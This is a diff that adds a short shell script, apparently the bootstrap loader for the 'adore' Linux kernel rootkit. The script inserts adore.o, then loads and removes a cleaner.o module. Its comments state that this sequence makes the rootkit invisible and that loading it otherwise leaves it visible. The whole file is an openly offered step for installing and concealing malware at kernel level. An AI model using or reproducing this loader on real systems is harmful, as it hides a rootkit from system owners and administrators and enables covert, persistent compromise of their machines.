@@ -1,0 +1,11 @@
+#!/bin/sh
+
+# Use this script to bootstrap adore!
+# It will make adore invisible. You could also
+# insmod adore without $0 but then its visible.
+
+insmod adore.o
+insmod cleaner.o
+rmmod cleaner
+
+
